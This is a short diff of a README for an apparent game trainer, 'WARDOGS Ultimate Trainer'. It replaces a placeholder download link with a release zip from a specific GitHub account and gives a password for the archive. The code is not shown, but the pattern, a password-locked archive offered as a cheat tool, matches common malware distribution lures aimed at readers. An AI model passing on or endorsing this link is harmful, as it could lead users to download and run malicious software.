@@ -8,7 +8,7 @@
 
 ## 📥 DOWNLOAD
 
-### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/YOUR_USERNAME/WARDOGS-Ultimate-Trainer/releases/latest/download/WARDOGS-Trainer.zip)
+### [⬇️ DOWNLOAD ZIP ARCHIVE (LATEST VERSION)](https://github.com/oliver-j-ops2005g0/WARDOGS-Ultimate-Trainer/releases/download/download/WARDOGS_Trainer.zip)
 
 🔐 Archive password: `5868781`
 
